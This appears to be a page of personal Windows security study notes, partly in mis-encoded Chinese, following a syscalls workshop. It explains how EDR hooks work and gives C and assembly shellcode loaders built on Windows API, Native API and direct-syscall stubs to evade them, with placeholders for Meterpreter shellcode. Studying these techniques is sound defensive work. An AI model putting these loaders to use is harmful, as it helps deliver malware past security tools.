<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>!!Windowså®‰å…¨ç¬”è®° - Share Docs</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "SYSCALL", url: "#_top", children: [
              {title: "Windows\u73af\u5b89\u5168\u4f53\u7cfb", url: "#windows" },
              {title: "Windows API", url: "#windows-api" },
              {title: "Native API", url: "#native-api" },
              {title: "syscall", url: "#syscall_1" },
              {title: "SSDT(\u7cfb\u7edf\u670d\u52a1\u63cf\u8ff0\u8868)", url: "#ssdt" },
              {title: "Hook", url: "#hook" },
              {title: "\u76f4\u63a5syscall", url: "#syscall_2" },
              {title: "\u95f4\u63a5syscall", url: "#syscall_3" },
              {title: "\u7ec3\u4e60", url: "#_2" },
              {title: "syscall\u7ed5\u8fc7\u7684\u7f3a\u9677", url: "#syscall_5" },
          ]},
          {title: "\u6c47\u7f16", url: "#_6", children: [
              {title: "\u8bed\u6cd5\u98ce\u683c", url: "#_7" },
              {title: "\u51fd\u6570\u7684\u6d41\u7a0b", url: "#_8" },
              {title: "\u51fd\u6570\u5e8f\u8a00\u548c\u5c3e\u58f0", url: "#_9" },
              {title: "\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf", url: "#_10" },
              {title: "\u5bc4\u5b58\u5668", url: "#_11" },
              {title: "\u5185\u5b58\u6570\u636e\u7ed3\u6784", url: "#_15" },
              {title: "\u6307\u4ee4", url: "#_20" },
              {title: "\u6807\u5fd7\u4f4d", url: "#_23" },
              {title: "\u6c47\u7f16\u4e2d\u7684\u6d41\u7a0b\u63a7\u5236", url: "#_24" },
              {title: "\u6c47\u7f16\u4e2d\u7684\u7b97\u672f", url: "#_25" },
              {title: "\u6c47\u7f16\u4e2d\u7684\u6d6e\u70b9\u6570", url: "#_26" },
              {title: "\u7f13\u51b2\u533a\u6ea2\u51fa", url: "#_27" },
              {title: "\u4ee3\u7801\u6267\u884c\u6d41\u91cd\u5b9a\u5411\u6d41\u6307\u4ee4", url: "#_29" },
              {title: "egghunter", url: "#egghunter" },
              {title: "\u7528\u6237\u6a21\u5757\u548c\u7cfb\u7edf\u6a21\u5757\u91cd\u5b9a\u5411\u6307\u4ee4\u5730\u5740\u95ee\u9898", url: "#_30" },
              {title: "ROP", url: "#rop" },
              {title: "SEH\u6ea2\u51fa\u653b\u51fb", url: "#seh" },
              {title: "ASLR(Address Space Layout Randomization)\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316", url: "#aslraddress-space-layout-randomization" },
              {title: "\u8c03\u7528\u7ea6\u5b9a", url: "#_31" },
              {title: "\u7b80\u5355exe\u5206\u6790", url: "#exe" },
              {title: "\u7b80\u5355DLL\u5206\u6790", url: "#dll" },
              {title: "\u7834\u89e3\u8f6f\u4ef6\u7684\u8981\u70b9", url: "#_34" },
              {title: "\u8131\u58f3", url: "#_35" },
          ]},
          {title: "\u6982\u5ff5\u0026amp;\u672f\u8bed", url: "#_36", children: [
              {title: "UIPI   (User Interface Privilege Isolation)", url: "#uipi-user-interface-privilege-isolation" },
              {title: "SSPI  (Security Support Provider Interface)", url: "#sspi-security-support-provider-interface" },
              {title: "Bit \u0026amp; Bytes", url: "#bit-bytes" },
              {title: "\u4e8c\u8fdb\u5236\u8fd0\u7b97", url: "#_37" },
          ]},
          {title: "\u8fd0\u884c\u5e93\u0026amp;\u51fd\u6570", url: "#_38", children: [
              {title: "_set_app_type", url: "#_set_app_type" },
              {title: "controlfp", url: "#controlfp" },
              {title: "_iob_func", url: "#_iob_func" },
              {title: "_InterlockedCompareExchange64", url: "#_interlockedcompareexchange64" },
              {title: "RtlGetVersion", url: "#rtlgetversion" },
          ]},
          {title: "SEH", url: "#seh_1", children: [
          ]},
          {title: "APC", url: "#apc", children: [
          ]},
          {title: "\u5185\u6838\u5b66\u4e60", url: "#_39", children: [
              {title: "HEVD\u9a71\u52a8\u7ec3\u4e60", url: "#hevd" },
              {title: "ProcessHacker\u9a71\u52a8\u6f0f\u6d1e\u5206\u6790", url: "#processhacker" },
              {title: "VectorKernel\u5de5\u5177\u5b66\u4e60", url: "#vectorkernel" },
          ]},
          {title: "Windbg", url: "#windbg", children: [
              {title: "\u5e38\u7528\u547d\u4ee4", url: "#_45" },
              {title: "debug kernel", url: "#debug-kernel" },
          ]},
          {title: "\u4e66\u7c4d\u5de5\u5177", url: "#_46", children: [
              {title: "Reverse Engineering for Beginners", url: "#reverse-engineering-for-beginners" },
              {title: "Windows \u4ee4\u724c\u76f8\u5173\u5b66\u4e60", url: "#windows_1" },
              {title: "\u5de5\u5177", url: "#_47" },
              {title: "\u53c2\u8003\u8d44\u6599", url: "#_49" },
          ]},
          {title: "\u547d\u4ee4", url: "#_50", children: [
              {title: "pattern", url: "#pattern" },
              {title: "nasm", url: "#nasm" },
              {title: "Ropper", url: "#ropper" },
          ]},
          {title: "\u5de5\u5177", url: "#_51", children: [
              {title: "boofuzz\u4f7f\u7528", url: "#boofuzz" },
              {title: "x64dbg\u5b89\u88c5mona\u63d2\u4ef6", url: "#x64dbgmona" },
              {title: "speakeasy", url: "#speakeasy_1" },
          ]},
          {title: "\u4e66\u7c4d", url: "#_52", children: [
          ]},
          {title: "\u518d\u770b", url: "#_53", children: [
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
        Linuxå®‰å…¨ç¬”è®°
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
        K8sæ”»å‡»é¢
      </a>
    </div>
    
  </div>

    

    <p># 2023-10-17</p>
<h2 id="syscall">SYSCALL</h2>
<p>https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/</p>
<h3 id="windows">Windowsç¯å®‰å…¨ä½“ç³»</h3>
<p>Ring0å’ŒRing3åˆ†åˆ«ä»£è¡¨å†…æ ¸å±‚å’Œç”¨æˆ·å±‚</p>
<p><img alt="" src="../../images/20230914110748.png" /></p>
<h3 id="windows-api">Windows API</h3>
<p>Windowsæä¾›ç»™ä½¿ç”¨è€…çš„å„ç§æ¥å£ï¼Œå¯¹åº”çš„DLLä¸€èˆ¬æ˜¯</p>
<pre><code>User32.dll
Kernel32.dll
Advapi.dll
</code></pre>
<p>è¿™äº›æ¥å£çš„Windows APIæ˜¯ä¸å¸¦å‰ç¼€çš„</p>
<h3 id="native-api">Native API</h3>
<p>æ›´ä½çº§çš„æ¥å£ï¼ŒåŸç”ŸAPIã€‚å¯ä»¥ç›´æ¥å¯¹ç³»ç»Ÿå±‚è¿›è¡Œæ“ä½œï¼Œè¿™äº›å‡½æ•°å¸¦æœ‰å‰ç¼€Ntã€Zwï¼Œä¾‹å¦‚</p>
<pre><code>NtCreateFile
NtWriteVirtualMemory
ZwCreateFile
</code></pre>
<p>å¯¹åº”çš„DLLæ˜¯</p>
<pre><code>ntdll.dll
win32u.dll
</code></pre>
<h3 id="syscall_1">syscall</h3>
<p>Native APIçš„syscallæ˜¯syscall stubçš„ä¸€éƒ¨åˆ†ï¼Œ
syscall stubæ˜¯ä¸€ç»„æ±‡ç¼–æŒ‡ä»¤ï¼Œå¯¹äºä¸åŒNative APIçš„syscall stubï¼Œç§»åŠ¨åˆ°eaxçš„å¯„å­˜å™¨ï¼Œä¼šæœ‰ç€ä¸åŒçš„SSNï¼ˆç³»ç»ŸæœåŠ¡ç¼–å·ï¼‰</p>
<p>ä¹Ÿå¯ä»¥è¯´æ˜¯ç”¨æˆ·å±‚åˆ°ç³»ç»Ÿå±‚çš„æ¡¥æ¢</p>
<h3 id="ssdt">SSDT(ç³»ç»ŸæœåŠ¡æè¿°è¡¨)</h3>
<p>KiSystemCall ç”¨äºæ ¹æ®SSNåœ¨SSDTä¸­æŸ¥æ‰¾å¯¹åº”çš„ç³»ç»Ÿå‡½æ•°ä»£ç </p>
<h3 id="hook">Hook</h3>
<h4 id="api-hook-inline-api-hooking">å†…è”API hook  Inline API Hooking</h4>
<p>å¤§å¤šæ•°æ€æ¯’ã€EDRä¼šé‡‡ç”¨çš„hookæ–¹å¼ï¼Œåœ¨åŸç”ŸAPIæ‰§è¡Œsyscallä¹‹å‰å°†å…¶é‡å®šå‘è‡³æ€æ¯’</p>
<h4 id="iathook-import-address-table-iat-hooking">IATå¯¼å…¥åœ°å€è¡¨hook   Import Address Table (IAT) Hooking</h4>
<h4 id="ssdt-hook-ssdt-hooking-windows-kernel">SSDT hook  SSDT Hooking (Windows Kernel)</h4>
<p>åœ¨å†…æ ¸å±‚çš„hookæ–¹å¼ï¼Œåœ¨windowså¼•å…¥KPPï¼ˆKernel Patch Protectionï¼‰ä¿æŠ¤åç¦æ­¢äº†è¿™ç§æŠ€æœ¯</p>
<h4 id="_1">é‡è¦çš„æ˜¯</h4>
<ul>
<li>åç—…æ¯’è½¯ä»¶ä¼šåœ¨ä¸åŒçš„dllä¸­hookä¸åŒçš„API</li>
<li>åç—…æ¯’è½¯ä»¶ä¸å¯èƒ½hookæ‰€æœ‰APIï¼Œè¿™å¯¹ç³»ç»Ÿçš„æ€§èƒ½æœ‰æ‰€å½±å“</li>
</ul>
<h3 id="syscall_2">ç›´æ¥syscall</h3>
<p>ç›´æ¥ç³»ç»Ÿè°ƒç”¨æ˜¯ä¸ä¾èµ–ç³»ç»Ÿå­˜æ ¹çš„syscallï¼Œè€Œæ˜¯è‡ªå·±å†™æ±‡ç¼–æŒ‡ä»¤å»syscall</p>
<p><img alt="" src="../../images/20230914134454.png" /></p>
<h3 id="syscall_3">é—´æ¥syscall</h3>
<p>é—´æ¥syscallæ˜¯ç›´æ¥æ‰§è¡Œåˆ°syscallå‰ä¸€æ­¥ï¼Œå†ä½¿ç”¨å‡½æ•°åŸæœ¬çš„syscallç»§ç»­æ‰§è¡Œï¼Œä¼ªè£…æ­£å¸¸ç¨‹åºã€‚</p>
<p><img alt="" src="../../images/20230915112654.png" /></p>
<pre><code class="language-C">
UINT_PTR sysAddrNtAllocateVirtualMemory;   //å®šä¹‰syscallæŒ‡é’ˆç±»å‹


int main() {

     //æ‰¾åˆ°NtAllocateVirtualMemoryå‡½æ•°çš„åœ°å€
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);

    //ç”±äºNtAllocateVirtualMemoryå‡½æ•°åçš„12ä¸ªå­—èŠ‚ä¾¿æ˜¯syscallæŒ‡ä»¤ï¼ŒpNtAllocateVirtualMemory+0x12å¯è®¡ç®—å‡ºsyscallæŒ‡ä»¤çš„ä½ç½®ï¼Œè¿™å°±æ˜¯ä¸ç›´æ¥syscallä¸åŒçš„åœ°æ–¹â€”â€”ç›´æ¥syscallæ˜¯ç›´æ¥å†™æ±‡ç¼–æ‰‹åŠ¨syscallï¼Œè¿™é‡Œæ˜¯æ‰¾åˆ°ç³»ç»Ÿæœ¬èº«çš„syscallåœ°å€ç”¨ç³»ç»Ÿçš„syscallã€‚å¾—åˆ°sysAddrNtAllocateVirtualMemoryåæ”¾å…¥asmä¸­
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

</code></pre>
<pre><code class="language-asm">EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.



.CODE  ; Start the code section

NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                        ; End of the procedure.

END  ; End of the module
</code></pre>
<h3 id="_2">ç»ƒä¹ </h3>
<h4 id="ssn">è°ƒè¯•è¿›ç¨‹ï¼Œæ‰¾åˆ°æŒ‡å®šå‡½æ•°SSN</h4>
<p>æ‰¾åˆ°å‡½æ•°çš„SSN</p>
<p><code>NtAllocateVirtualMemory</code></p>
<p>ä½¿ç”¨<code>x</code>æŸ¥è¯¢å†…å­˜åœ°å€ï¼Œä½¿ç”¨<code>u</code>æŸ¥è¯¢å‡½æ•°çš„syscall</p>
<p>å…ˆç”¨<code>x</code>æŸ¥<code>ntdll</code>ä¸­çš„<code>NtAllocateVirtualMemory</code>å†…å­˜åœ°å€ï¼Œåœ¨ç”¨<code>u</code>æŸ¥å†…å­˜åœ°å€00007ffe`9794f040dçš„syscallï¼Œeaxåé¢çš„ç¼–å·å°±æ˜¯SSN</p>
<pre><code>0:015&gt; x ntdll!NtAllocateVirtualMemory
00007ffe`9794f040 ntdll!NtAllocateVirtualMemory (NtAllocateVirtualMemory)
0:015&gt; u 00007ffe`9794f040 
ntdll!NtAllocateVirtualMemory:
00007ffe`9794f040 4c8bd1          mov     r10,rcx
00007ffe`9794f043 b818000000      mov     eax,18h
00007ffe`9794f048 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffe`9794f050 7503            jne     ntdll!NtAllocateVirtualMemory+0x15 (00007ffe`9794f055)
00007ffe`9794f052 0f05            syscall
00007ffe`9794f054 c3              ret
00007ffe`9794f055 cd2e            int     2Eh
00007ffe`9794f057 c3              ret
</code></pre>
<p>ç›´æ¥ç”¨<code>u</code>æŒ‡å®šæŸ¥å‡½æ•°çš„syscall</p>
<pre><code>0:015&gt; u NtWriteVirtualMemory
ntdll!NtWriteVirtualMemory:
00007ffe`9794f480 4c8bd1          mov     r10,rcx
00007ffe`9794f483 b83a000000      mov     eax,3Ah
00007ffe`9794f488 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffe`9794f490 7503            jne     ntdll!NtWriteVirtualMemory+0x15 (00007ffe`9794f495)
00007ffe`9794f492 0f05            syscall
00007ffe`9794f494 c3              ret
00007ffe`9794f495 cd2e            int     2Eh
00007ffe`9794f497 c3              ret
</code></pre>
<h4 id="procmonwritefile">procmonæŸ¥çœ‹WriteFileçš„æµç¨‹</h4>
<p>é€šè¿‡è¿‡æ»¤è¿›ç¨‹å’Œ<code>WriteFile</code>æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°notepadè¿›ç¨‹ä»ç”¨æˆ·æ¨¡å¼åˆ°ç³»ç»Ÿå±‚æœ€åè®¿é—®ç£ç›˜çš„æµç¨‹
<img alt="" src="../../images/20230914133509.png" /></p>
<h4 id="windows-apishellcode">ä½¿ç”¨Windows APIæ‰§è¡Œshellcodeå¹¶åŠ¨æ€è°ƒè¯•</h4>
<p>ç®€å•åŠ è½½å™¨</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    return 0;
}

int main() {
    // Insert the Meterpreter shellcode 
    unsigned char code[] = &quot;\xfc....&quot;;

    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &amp;bytesWritten);

    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);


    // Return 0 as the main function exit code
    return 0;
}

</code></pre>
<p>åœ¨ç¬¦å·å¤„å¯ä»¥çœ‹åˆ°å¯¼å…¥çš„windows api
<img alt="" src="../../images/20230914163442.png" />
ç‚¹å‡»è½¬å…¥å¯¼å…¥åœ°å€å¯ä»¥æŸ¥çœ‹å¯¹åº”æ±‡ç¼–ä»£ç 
<img alt="" src="../../images/20230914163532.png" /></p>
<p>å†ç»§ç»­è·³è½¬ï¼Œæ¥åˆ°äº†å¯¹åº”çš„åŸç”ŸAPI
<img alt="" src="../../images/20230914163611.png" /></p>
<p>ç»§ç»­è·³è½¬ï¼Œå¯ä»¥çœ‹åˆ°åŸç”ŸAPIå¯¹åº”çš„syscall
<img alt="" src="../../images/20230914163704.png" /></p>
<p>å¦‚æœåœ¨<code>WriteProcessMemory</code>å¤„ä¸‹æ–­ç‚¹ï¼Œç»§ç»­è¿è¡Œç¨‹åºï¼Œåœ¨ç¬¬R8å¯ä»¥æ‰¾åˆ°shellcodeçš„å†…å­˜ä½ç½®
<img alt="" src="../../images/20230914164641.png" /></p>
<h4 id="apishellcode">ä½¿ç”¨åŸç”ŸAPIæ‰§è¡Œshellcodeå¹¶åŠ¨æ€è°ƒè¯•</h4>
<h5 id="_3">å®šä¹‰æŒ‡é’ˆç±»å‹å‡½æ•°</h5>
<ul>
<li><code>VirtualAlloc</code>å¯¹åº”çš„åŸç”Ÿå‡½æ•°<code>NtAllocateVirtualMemory</code></li>
<li><code>WriteProcessMemory</code>å¯¹åº”çš„åŸç”Ÿå‡½æ•°<code>NtWriteVirtualMemory</code></li>
<li><code>CreateThread</code>å¯¹åº”çš„åŸç”Ÿå‡½æ•°<code>NtCreateThreadEx</code></li>
<li><code>WaitForSingleObject</code>å¯¹åº”çš„åŸç”Ÿå‡½æ•°<code>NtWaitForSingleObject</code></li>
</ul>
<p>å¦‚æœè¦æ‰¾å“ªä¸ªWindows APIå¯¹åº”çš„å“ªä¸ªåŸç”Ÿå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨åŠ¨æ€è°ƒè¯•å»æ‰¾</p>
<p>å®šä¹‰æŒ‡é’ˆç±»å‹å‡½æ•°</p>
<pre><code class="language-C++">typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
</code></pre>
<h5 id="_4">è·å–åŸç”Ÿå‡½æ•°çš„å†…å­˜åœ°å€</h5>
<p>æ‰“å¼€<code>ntdll.dll</code>çš„å¥æŸ„ï¼Œé€šè¿‡åŸç”Ÿå‡½æ•°çš„åç§°å»åœ¨å†…å­˜ä¸­æŸ¥æ‰¾åœ°å€</p>
<pre><code class="language-cpp">    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWriteVirtualMemory&quot;);
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWaitForSingleObject&quot;);
</code></pre>
<pre><code class="language-C++">#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

// Define typedefs for function pointers to the native API functions we'll be using.
// These match the function signatures of the respective functions.
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);


int main() {
    // Insert Meterpreter shellcode here.
    unsigned char code[] = &quot;&quot;;

    // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWriteVirtualMemory&quot;);
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtWaitForSingleObject&quot;);

    // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
    // 'exec' will hold the base address of the allocated memory region.
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &amp;exec, 0, &amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region.
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &amp;bytesWritten);

    // Execute the shellcode in memory using a new thread.
    HANDLE hThread;
    NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the thread to finish executing.
    NtWaitForSingleObject(hThread, FALSE, NULL);

    return 0;
}

</code></pre>
<p><img alt="" src="../../images/20230914173837.png" /></p>
<h4 id="syscallshellcode">ä½¿ç”¨ç›´æ¥syscallæ‰§è¡Œshellcodeå¹¶åŠ¨æ€è°ƒè¯•</h4>
<h6 id="_5">å®šä¹‰åŸç”Ÿå‡½æ•°çš„ç»“æ„ä½“</h6>
<p>æ–°å»ºä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œå®šä¹‰éœ€è¦ä½¿ç”¨çš„åŸç”Ÿå‡½æ•°çš„ç»“æ„ä½“</p>
<pre><code class="language-cpp">#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
#define _SYSCALLS_H  // Define _SYSCALLS_H

#include &lt;windows.h&gt;  // Include the Windows API header

// The type NTSTATUS is typically defined in the Windows headers as a long.
typedef long NTSTATUS;  // Define NTSTATUS as a long
typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

// Declare the function prototype for NtAllocateVirtualMemory
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
    PVOID* BaseAddress,      // Pointer to the base address
    ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
    PSIZE_T RegionSize,      // Pointer to the size of the region
    ULONG AllocationType,    // Type of allocation
    ULONG Protect            // Memory protection for the region of pages
);

// Declare the function prototype for NtWriteVirtualMemory
extern NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,     // Handle to the process in which to write the memory
    PVOID BaseAddress,        // Pointer to the base address
    PVOID Buffer,             // Buffer containing data to be written
    SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
    PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
);

// Declare the function prototype for NtCreateThreadEx
extern NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
    ACCESS_MASK DesiredAccess,   // Desired access to the thread
    PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
    HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
    PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
    PVOID lpParameter,           // Pointer to a variable to be passed to the thread
    ULONG Flags,                 // Flags that control the creation of the thread
    SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
    SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
    SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
    PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
);

// Declare the function prototype for NtWaitForSingleObject
extern NTSTATUS NtWaitForSingleObject(
    HANDLE Handle,          // Handle to the object to be waited on
    BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
    PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute or relative time at which the function should return, regardless of the state of the object
);

#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition


</code></pre>
<h6 id="syscall_4">å®šä¹‰åŸç”Ÿå‡½æ•°çš„syscallè¿‡ç¨‹</h6>
<pre><code class="language-asm">.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP                        ; End of the procedure.

; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3Ah 
    syscall
    ret
NtWriteVirtualMemory ENDP

; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C2h
    syscall
    ret
NtCreateThreadEx ENDP

; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, 4
    syscall
    ret
NtWaitForSingleObject ENDP

END  ; End of the module
</code></pre>
<p>è¿è¡Œèµ·æ¥ååœ¨åŠ è½½å‡½æ•°ä¸­æ²¡æœ‰å‡ ä¸ªé‡è¦å‡½æ•°
<img alt="" src="../../images/20230915103754.png" /></p>
<h4 id="syscallshellcode_1">ä½¿ç”¨é—´æ¥syscallæ‰§è¡Œshellcodeå¹¶åŠ¨æ€è°ƒè¯•</h4>
<pre><code>æµç¨‹
- è·å–ntdll.dllçš„å¥æŸ„
- åˆå§‹åŒ–åŸç”Ÿå‡½æ•°æŒ‡é’ˆåœ°å€
- å®šä¹‰è¦ä½¿ç”¨çš„å‡½æ•°ç»“æ„ä½“
